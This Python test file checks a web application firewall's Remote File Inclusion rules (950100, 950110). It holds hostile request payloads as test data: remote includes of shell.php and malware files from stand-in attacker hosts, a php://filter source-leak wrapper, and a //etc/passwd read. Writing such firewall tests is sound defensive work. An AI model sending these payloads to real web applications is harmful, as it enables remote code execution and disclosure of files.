"""Tests for Remote File Inclusion rules (950100, 950110)."""
from bastion.core.normalizer import normalize_request
from bastion.rules.rfi import RemoteFileInclusionRule, RFIEvasionRule


def _make_request(method="GET", path="/", query_string="", headers=None, body=b""):
    return normalize_request(method, path, query_string=query_string, headers=headers or {}, body=body)


# ── 950100 Remote File Inclusion ──────────────────────────────────────────────

def test_rfi_remote_php_blocked():
    req = _make_request(query_string="file=http://attacker.com/shell.php")
    verdict = RemoteFileInclusionRule().match(req)
    assert verdict.blocked
    assert verdict.rule_id == "950100"


def test_rfi_remote_txt_blocked():
    req = _make_request(query_string="include=http://evil.org/malware.txt")
    verdict = RemoteFileInclusionRule().match(req)
    assert verdict.blocked


def test_rfi_ftp_blocked():
    req = _make_request(query_string="page=ftp://malicious.net/exploit.py")
    verdict = RemoteFileInclusionRule().match(req)
    assert verdict.blocked


def test_rfi_clean_local_path_allowed():
    req = _make_request(query_string="page=about_us&lang=en")
    verdict = RemoteFileInclusionRule().match(req)
    assert not verdict.blocked


# ── 950110 RFI Evasion ────────────────────────────────────────────────────────

def test_rfi_wrapper_blocked():
    req = _make_request(query_string="file=php://filter/convert.base64-encode/resource=index.php")
    verdict = RFIEvasionRule().match(req)
    assert verdict.blocked
    assert verdict.rule_id == "950110"


def test_rfi_double_slash_evasion_blocked():
    req = _make_request(query_string="path=//etc/passwd")
    verdict = RFIEvasionRule().match(req)
    assert verdict.blocked
